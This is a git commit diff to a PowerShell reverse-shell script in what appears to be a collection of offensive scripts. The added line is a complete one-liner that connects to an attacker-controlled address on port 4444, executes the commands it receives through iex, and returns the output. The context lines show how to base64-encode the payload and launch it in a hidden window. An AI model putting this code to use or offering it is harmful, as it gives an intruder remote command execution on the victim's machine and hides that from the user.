22a2d9f70ed651a9e7ef7d5540e2841d14736b9d
skinnerv <piotr.ghost@gmail.com>
2023-12-13 14:22:52 +0100

    Update powershell-reverse-shell.ps1

--- reverse-shell-scripts/powershell-reverse-shell.ps1
+++ reverse-shell-scripts/powershell-reverse-shell.ps1
@@ -3,3 +3,8 @@ $client = New-Object System.Net.Sockets.TCPClient('00.00.00.00',4444);$stream = 
 in order to create base64 payload for windows on linux
 powershell.exe -nop -w hidden -e <BASE64>
 echo -e "powershell.exe -nop -w hidden -e $(cat ./powershell-reverse-shell.txt| iconv -f UTF8 -t UTF16LE | base64 | tr -d '\n')" > powershell-reverse-shell.ps1
+
+
+
+powershell.exe -Command "$client = New-Object System.Net.Sockets.TCPClient('192.168.XX.XXX',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
